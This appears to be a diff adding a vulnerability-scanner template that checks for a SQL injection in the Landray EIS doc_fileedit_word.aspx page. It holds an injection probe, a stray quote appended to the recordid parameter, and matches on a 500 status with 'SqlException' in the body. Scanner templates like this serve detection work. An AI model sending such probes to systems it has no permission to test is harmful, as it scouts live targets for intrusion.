@@ -1,0 +1,19 @@
+id: landray-eis-doc-fileedit-word-sqli
+
+info:
+  name: 蓝凌EIS doc_fileedit_word.aspx SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /dossier/doc_fileedit_word.aspx?recordid=2015122918374828'&edittype=1,1 HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"SqlException")
+          - status_code == 500
